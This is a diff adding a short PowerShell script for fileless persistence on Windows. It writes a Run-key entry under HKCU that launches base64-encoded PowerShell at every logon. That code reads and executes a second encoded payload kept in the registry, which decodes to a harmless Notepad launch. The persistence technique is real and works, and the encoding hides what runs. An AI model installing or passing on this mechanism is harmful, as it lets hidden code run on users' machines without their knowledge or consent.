@@ -1,0 +1,6 @@
+# simple PS fileless persistence install using the registry 
+
+# set persistence and read in payload
+New-ItemProperty 'HKCU:Software\Microsoft\Windows\CurrentVersion\Run' -Name 'Persist' -Value '$s = powershell.exe -enc RwBlAHQALQBJAHQAZQBtAFAAcgBvAHAAZQByAHQAeQBWAGEAbAB1AGUAIAAnAEgASwBDAFUAOgBTAG8AZgB0AHcAYQByAGUAXAAnACAALQBOAGEAbQBlACAAVABlAHMAdABQAGEAeQBsAG8AYQBkAA==; powershell.exe -e $s'
+# set encoded payload
+New-ItemProperty 'HKCU:Software' -Name 'TestPayload' -Value 'cwB0AGEAcgB0AC0AcAByAG8AYwBlAHMAcwAgAG4AbwB0AGUAcABhAGQALgBlAHgAZQA='
